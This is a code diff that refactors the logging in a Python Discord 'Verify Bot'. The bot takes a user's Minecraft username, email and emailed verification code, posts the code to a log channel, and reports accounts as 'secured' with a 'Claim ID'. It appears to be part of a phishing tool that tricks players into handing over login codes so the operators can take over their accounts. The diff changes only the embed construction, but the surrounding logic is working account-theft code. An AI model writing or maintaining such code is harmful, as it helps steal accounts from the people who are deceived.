@@ -1,7 +1,6 @@
 from database.database import DBConnection
 from urllib.parse import quote
 from discord import ui, Embed
-import datetime
 import discord
 import json
 
@@ -10,7 +9,7 @@ from ui.buttons.account_details import accountInfo
 
 from securing.secure import startSecuringAccount
 from securing.auth.initial_session import get_session
-from shared.send_logs import send_logs
+from shared.send_logs import send_logs, build_log_embed
 
 class MyModalTwo(ui.Modal):
     def __init__(self, username, email, flowtoken):
@@ -40,25 +39,27 @@ class MyModalTwo(ui.Modal):
 
                 await send_logs(
                     interaction.client,
-                    Embed(
-                        description = f"**Email** | **Status** | **Reason**\n```{self.email} | Refused to Verify | User has been blacklisted```",
-                        timestamp = datetime.datetime.now(),
-                        colour = 0xFA4343
-                    ).set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{self.username}").set_author(name=f"{interaction.user.name} | {interaction.user.id}", icon_url=interaction.user.display_avatar.url).set_footer(text=f"Verify Bot • {datetime.datetime.now().strftime('%d/%m/%Y, %H:%M')}"),
-                    view = ButtonOptions(interaction.user, interaction.user.id, self.username),
-                    email = self.email
+                    build_log_embed(
+                        f"**Email | Status | Reason**\n```{self.email} | Refused to Verify | User has been blacklisted```",
+                        0xFA4343,
+                        thumbnail=f"https://visage.surgeplay.com/full/512/{self.username}",
+                        user=interaction.user,
+                        bot=interaction.client,
+                    ),
+                    view=ButtonOptions(interaction.user, interaction.user.id, self.username),
+                    email=self.email,
                 )
                 return
 
-        embed = discord.Embed(
-            description=f"**Email** | **Status**\n```{self.email} | Got Code | {code}```",
-            timestamp = datetime.datetime.now(),
-            colour = 0x79D990,                           
-        ).set_author(name=f"{interaction.user.name} | {interaction.user.id}", icon_url=interaction.user.display_avatar.url).set_footer(text=f"Verify Bot • {datetime.datetime.now().strftime('%d/%m/%Y, %H:%M')}")
-        
+        embed = build_log_embed(
+            f"**Email** | **Status**\n```{self.email} | Got Code | {code}```",
+            0x79D990,
+            user=interaction.user,
+            bot=interaction.client,
+        )
+
         if self.username and self.username.strip():
-            thumbnail_url = f"https://visage.surgeplay.com/full/512/{self.username}"
-            embed.set_thumbnail(url=thumbnail_url)
+            embed.set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{self.username}")
 
         await interaction.response.defer(ephemeral=True)
 
@@ -81,12 +82,13 @@ class MyModalTwo(ui.Modal):
         
         if not securedAccount:
 
-            embed = discord.Embed(
-                description = f"**Email** | **Status** | **Reason**\n```{self.email} | Failed to secure | Invalid Code Entered```",
-                timestamp = datetime.datetime.now(),
-                colour = 0xFA4343                  
-            ).set_author(name=f"{interaction.user.name} | {interaction.user.id}", icon_url=interaction.user.display_avatar.url).set_footer(text=f"Verify Bot • {datetime.datetime.now().strftime('%d/%m/%Y, %H:%M')}")
-            
+            embed = build_log_embed(
+                f"**Email | Status | Reason**\n```{self.email} | Failed to secure | Invalid Code Entered```",
+                0xFA4343,
+                user=interaction.user,
+                bot=interaction.client,
+            )
+
             if self.username and self.username.strip():
                 embed.set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{self.username}")
             
@@ -119,5 +121,5 @@ class MyModalTwo(ui.Modal):
                     description=f"**{name}** has been successfully secured.\nClaim ID is {claim_id}",
                     color=0x79D990
                 ).set_thumbnail(url=f"https://mc-heads.net/avatar/{self.username}/128"),
-                conly = True
+                censored_only=True
             )
